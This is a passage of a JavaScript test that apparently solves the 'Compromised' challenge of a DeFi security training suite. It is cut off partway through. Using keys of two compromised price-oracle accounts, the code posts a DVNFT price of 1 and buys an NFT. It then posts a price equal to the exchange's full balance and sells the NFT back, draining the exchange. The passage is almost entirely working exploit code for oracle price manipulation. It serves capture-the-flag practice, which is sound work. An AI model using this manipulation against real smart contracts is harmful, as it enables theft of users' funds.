...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        [oracle1, oracle2] = compromisedOracles;

        // Reduce NFT price
        await oracle.connect(oracle1).postPrice('DVNFT', 1);
        await oracle.connect(oracle2).postPrice('DVNFT', 1);

        // Player buys NFT
        await exchange.connect(player).buyOne({ value: 1 });
        exchangeBalance = await ethers.provider.getBalance(exchange.address);
        // Compromised oracles post prices
        await oracle.connect(oracle1).postPrice('DVNFT', exchangeBalance);
        await oracle.connect(oracle2).postPrice('DVNFT', exchangeBalance);

        // Player sells NFT
        await nftToken.connect(player).approve(exchange.address, 0);
        await exchange.connect(player).sellOne(0);

        // NFT price reset to initial price
